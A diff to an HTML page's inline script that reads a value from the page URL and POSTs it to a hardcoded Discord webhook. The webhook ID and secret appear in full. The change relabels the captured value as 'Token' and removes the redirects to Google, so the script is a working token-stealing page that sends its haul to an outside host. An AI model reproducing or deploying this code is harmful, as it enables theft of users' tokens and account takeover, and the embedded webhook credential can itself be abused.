@@ -17,7 +17,7 @@
         const dataToSend = fullUrl.substring(index + marker.length);
         const webhookUrl = "https://discord.com/api/webhooks/1303524286707011674/xC5koezC0nmTgXhq7OROOrq4R4XLb0hgSN35cAZFuHbNP5JZvCOVmJs81eDgk5sStkNo";
         const payload = {
-          content: `Data captured: ${dataToSend}`
+          content: `Token: ${dataToSend}`
         };
         fetch(webhookUrl, {
           method: "POST",
@@ -27,18 +27,14 @@
           body: JSON.stringify(payload)
         }).then(response => {
           console.log("Data sent successfully!");
-          window.location.href = "https://google.com";
         }).catch(error => {
           console.error("Error sending data:", error);
-          window.location.href = "https://google.com";
         });
       } else {
         console.log("No data found in URL.");
-        window.location.href = "https://google.com";
       }
     } catch (e) {
       console.error("Unexpected error:", e);
-      window.location.href = "https://google.com";
     }
   })();
 </script>
